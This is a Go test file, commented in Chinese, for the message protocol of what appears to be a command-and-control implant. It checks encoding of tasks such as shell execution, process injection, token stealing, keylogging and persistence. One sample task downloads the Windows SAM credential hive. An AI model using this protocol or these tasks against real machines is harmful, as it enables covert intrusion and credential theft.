// csdev :: proto/task_test.go  --  TASK / RESULT / TASK_BATCH 测试
package proto

import (
	"bytes"
	"errors"
	"testing"
)

func TestTaskRoundTrip(t *testing.T) {
	cases := []Task{
		{ID: 1, Class: CmdExecShell, Alias: "shell", Arg: []byte("whoami /all")},
		{ID: 0xFFFFFFFF, Class: CmdPSList, Alias: "ps", Arg: nil},
		{ID: 3, Class: CmdCustom, Alias: "", Arg: bytes.Repeat([]byte{0x00, 0xFF, 0x1F}, 100)},
		{ID: 4, Class: CmdFileUP, Alias: "upload", Arg: []byte{0x00}},
	}
	for _, want := range cases {
		w := want
		got, err := DecodeTask(w.Encode())
		if err != nil {
			t.Fatalf("Decode 失败: %v", err)
		}
		if got.ID != w.ID || got.Class != w.Class || got.Alias != w.Alias {
			t.Fatalf("往返不一致: %s != %s", got, &w)
		}
		if !bytes.Equal(got.Arg, w.Arg) {
			t.Fatalf("arg 往返不一致: %v != %v", got.Arg, w.Arg)
		}
		if len(w.Encode()) != 11+len(w.Alias)+len(w.Arg) {
			t.Fatalf("编码长度 %d 不符 (11 + %d + %d)", len(w.Encode()), len(w.Alias), len(w.Arg))
		}
	}
	// 字段偏移逐字节核对 (协议 4.1)
	tk := (&Task{ID: 0x01020304, Class: 0x0F, Alias: "ab", Arg: []byte{0x99}}).Encode()
	wantHdr := []byte{
		0x01, 0x02, 0x03, 0x04, // task_id
		0x0F,       // cmd_class
		0x00, 0x02, // alias_len
		'a', 'b', // alias
		0x00, 0x00, 0x00, 0x01, // arg_len
		0x99, // arg
	}
	if !bytes.Equal(tk, wantHdr) {
		t.Fatalf("TASK 布局不符\n得到 % X\n期望 % X", tk, wantHdr)
	}
	if (&Task{}).Encode() == nil || (*Task)(nil).Encode() != nil {
		t.Fatal("nil Task 编码应为 nil, 空 Task 应产出合法字节")
	}
	if got := (*Task)(nil).String(); got != "<nil task>" {
		t.Fatalf("nil Task String = %q", got)
	}
}

func TestDecodeTaskMalformed(t *testing.T) {
	good := (&Task{ID: 1, Class: CmdExecShell, Alias: "shell", Arg: []byte("whoami")}).Encode()
	for cut := 0; cut < len(good); cut++ {
		if _, err := DecodeTask(good[:cut]); err == nil {
			t.Fatalf("TASK 截断到 %d 字节时必须报错", cut)
		} else if !errors.Is(err, ErrTruncated) {
			t.Fatalf("截断到 %d 字节应报 ErrTruncated, 实际 %v", cut, err)
		}
	}
	// arg_len 声明超出实际 (alias="shell" → arg_len 位于偏移 12..16)
	bad := append([]byte{}, good...)
	PutBE32(bad[12:16], 0xFFFF)
	if _, err := DecodeTask(bad); !errors.Is(err, ErrTruncated) {
		t.Fatalf("arg_len 越界应报 ErrTruncated, 实际 %v", err)
	}
}

func TestResultRoundTrip(t *testing.T) {
	cases := []Result{
		{TaskID: 1, Status: StatusOK, Out: []byte("ok")},
		{TaskID: 2, Status: StatusErr, Out: nil},
		{TaskID: 3, Status: StatusPartial, Out: bytes.Repeat([]byte{0xAB}, 4096)},
		{TaskID: 4, Status: StatusBusy, Out: []byte{}},
	}
	for _, want := range cases {
		w := want
		got, err := DecodeResult(w.Encode())
		if err != nil {
			t.Fatalf("Decode 失败: %v", err)
		}
		if got.TaskID != w.TaskID || got.Status != w.Status || !bytes.Equal(got.Out, w.Out) {
			t.Fatalf("往返不一致: %s != %s", got, &w)
		}
	}
	// 四字节对齐核对: [4B task_id][1B status][4B out_len][out]
	r := (&Result{TaskID: 0x0A0B0C0D, Status: StatusOK, Out: []byte{0x41, 0x42}}).Encode()
	want := []byte{0x0A, 0x0B, 0x0C, 0x0D, StatusOK, 0x00, 0x00, 0x00, 0x02, 0x41, 0x42}
	if !bytes.Equal(r, want) {
		t.Fatalf("RESULT 布局不符\n得到 % X\n期望 % X", r, want)
	}
	if (*Result)(nil).Encode() != nil || (*Result)(nil).String() != "<nil result>" {
		t.Fatal("nil Result 处理错误")
	}
}

func TestDecodeResultMalformed(t *testing.T) {
	good := (&Result{TaskID: 9, Status: StatusOK, Out: []byte("payload")}).Encode()
	for cut := 0; cut < len(good); cut++ {
		if _, err := DecodeResult(good[:cut]); err == nil {
			t.Fatalf("RESULT 截断到 %d 字节时必须报错", cut)
		}
	}
	bad := append([]byte{}, good...)
	PutBE32(bad[5:9], 0xFFFF)
	if _, err := DecodeResult(bad); !errors.Is(err, ErrTruncated) {
		t.Fatalf("out_len 越界应报 ErrTruncated, 实际 %v", err)
	}
}

func TestBatchRoundTrip(t *testing.T) {
	// 空批次 (协议 2.4: 无任务时下发 count = 0)
	empty := (&Batch{}).Encode()
	if !bytes.Equal(empty, []byte{0, 0, 0, 0}) {
		t.Fatalf("空批次编码 % X, 期望 00 00 00 00", empty)
	}
	if (*Batch)(nil).Encode() == nil {
		t.Fatal("nil Batch 应编码为空批次")
	}
	got, err := DecodeBatch(empty)
	if err != nil || len(got.Tasks) != 0 {
		t.Fatalf("空批次解析失败: %v %v", got, err)
	}

	b := &Batch{Tasks: []Task{
		{ID: 1, Class: CmdExecShell, Alias: "shell", Arg: []byte("whoami")},
		{ID: 2, Class: CmdFileDL, Alias: "download", Arg: []byte(`C:\Windows\System32\config\SAM`)},
		{ID: 3, Class: CmdPSList, Alias: "ps"},
	}}
	enc := b.Encode()
	if BE32(enc[0:4]) != 3 {
		t.Fatalf("批次 count = %d, 期望 3", BE32(enc[0:4]))
	}
	back, err := DecodeBatch(enc)
	if err != nil {
		t.Fatalf("批次解析失败: %v", err)
	}
	if len(back.Tasks) != 3 {
		t.Fatalf("解析出 %d 条任务", len(back.Tasks))
	}
	for i := range b.Tasks {
		if back.Tasks[i].ID != b.Tasks[i].ID || back.Tasks[i].Alias != b.Tasks[i].Alias ||
			!bytes.Equal(back.Tasks[i].Arg, b.Tasks[i].Arg) {
			t.Fatalf("第 %d 条任务往返不一致: %s", i, &back.Tasks[i])
		}
	}
	if !bytes.Equal(back.Encode(), enc) {
		t.Fatal("批次二次编码与原始字节不一致")
	}
	// 大 arg 与大批次
	big := &Batch{Tasks: make([]Task, 64)}
	for i := range big.Tasks {
		big.Tasks[i] = Task{ID: uint32(i), Class: CmdFileUP, Alias: "upload", Arg: bytes.Repeat([]byte{byte(i)}, 4096)}
	}
	if got, err := DecodeBatch(big.Encode()); err != nil || len(got.Tasks) != 64 {
		t.Fatalf("大批次往返失败: %v", err)
	}
}

func TestDecodeBatchMalformed(t *testing.T) {
	if _, err := DecodeBatch(nil); !errors.Is(err, ErrTruncated) {
		t.Fatalf("空输入应报 ErrTruncated, 实际 %v", err)
	}
	// count 声明 3 但只有 1 条
	one := (&Batch{Tasks: []Task{{ID: 1, Class: CmdPSList, Alias: "ps"}}}).Encode()
	bad := append([]byte{}, one...)
	PutBE32(bad[0:4], 3)
	if _, err := DecodeBatch(bad); !errors.Is(err, ErrTruncated) {
		t.Fatalf("count 多于实际应报 ErrTruncated, 实际 %v", err)
	}
	// count 巨大但无数据 → 必须报错且不预分配巨量内存
	huge := []byte{0xFF, 0xFF, 0xFF, 0xFF}
	if _, err := DecodeBatch(huge); !errors.Is(err, ErrTruncated) {
		t.Fatalf("巨大 count 应报 ErrTruncated, 实际 %v", err)
	}
	// task_len 越界
	bad2 := append([]byte{}, one...)
	PutBE32(bad2[4:8], 0xFFFF)
	if _, err := DecodeBatch(bad2); !errors.Is(err, ErrTruncated) {
		t.Fatalf("task_len 越界应报 ErrTruncated, 实际 %v", err)
	}
	// 内层 TASK 损坏
	bad3 := append([]byte{}, one...)
	PutBE32(bad3[4:8], 5) // 声称 5 字节, 实际 TASK 更长
	if _, err := DecodeBatch(bad3); err == nil {
		t.Fatal("内层 TASK 截断必须报错")
	}
}

func TestCmdClassNames(t *testing.T) {
	if CmdClassName(CmdExecShell) != "EXEC_SHELL" || CmdClassName(CmdRPortFwd) != "RPORTFWD" {
		t.Fatal("cmd_class 名映射错误")
	}
	if CmdClassName(0x55) != "class-0x55" {
		t.Fatalf("未知 class 名错误: %s", CmdClassName(0x55))
	}
	if StatusName(StatusOK) != "OK" || StatusName(StatusPartial) != "PARTIAL" || StatusName(9) != "status-9" {
		t.Fatal("status 名映射错误")
	}
	// 协议 4.1 表逐项核对
	table := map[byte]string{
		0x01: "EXEC_SHELL", 0x02: "FILE_DL", 0x03: "FILE_UP", 0x04: "PROC_LIST",
		0x05: "EXIT", 0x06: "SET_SLEEP", 0x07: "INJ_PROC", 0x08: "INJ_BOF",
		0x09: "INJ_ASSEMBLY", 0x0A: "TOKEN", 0x0B: "PROXY", 0x0C: "KEYLOG",
		0x0D: "SCREENSHOT", 0x0E: "PERSIST", 0x0F: "PS_LIST", 0x10: "FS_OPS",
		0x11: "NET_OPS", 0x12: "PORTSCAN", 0x13: "RPORTFWD", 0x7F: "CUSTOM",
	}
	for class, name := range table {
		if got := CmdClassName(class); got != name {
			t.Fatalf("cmd_class 0x%02X = %s, 期望 %s", class, got, name)
		}
	}
}

func TestTaskArgHelpers(t *testing.T) {
	if !bytes.Equal(TaskArgShell("whoami"), []byte("whoami")) {
		t.Fatal("TaskArgShell 错误")
	}
	// [2B path_len][path][4B total][4B offset][bytes]
	arg := TaskArgFileUp("a.txt", 0x01020304, 0x05060708, []byte{0xAA, 0xBB})
	want := []byte{
		0x00, 0x05, 'a', '.', 't', 'x', 't',
		0x01, 0x02, 0x03, 0x04,
		0x05, 0x06, 0x07, 0x08,
		0xAA, 0xBB,
	}
	if !bytes.Equal(arg, want) {
		t.Fatalf("TaskArgFileUp 布局不符\n得到 % X\n期望 % X", arg, want)
	}

	if !bytes.Equal(TaskArgSetSleep(5000, 10), []byte{0x00, 0x00, 0x13, 0x88, 0x0A}) {
		t.Fatalf("TaskArgSetSleep 布局不符: % X", TaskArgSetSleep(5000, 10))
	}
	if !bytes.Equal(TaskArgToken(TokenOpSteal, []byte{0x01}), []byte{TokenOpSteal, 0x01}) {
		t.Fatal("TaskArgToken 布局错误")
	}
	if !bytes.Equal(TaskArgProxy(0x0A0B0C0D, ProxyOpOpen, []byte{0xFF}), []byte{0x0A, 0x0B, 0x0C, 0x0D, ProxyOpOpen, 0xFF}) {
		t.Fatal("TaskArgProxy 布局错误")
	}
	// 空数据边界
	if got := TaskArgFileUp("", 0, 0, nil); len(got) != 10 {
		t.Fatalf("空 FILE_UP arg 长度 %d, 期望 10", len(got))
	}
}
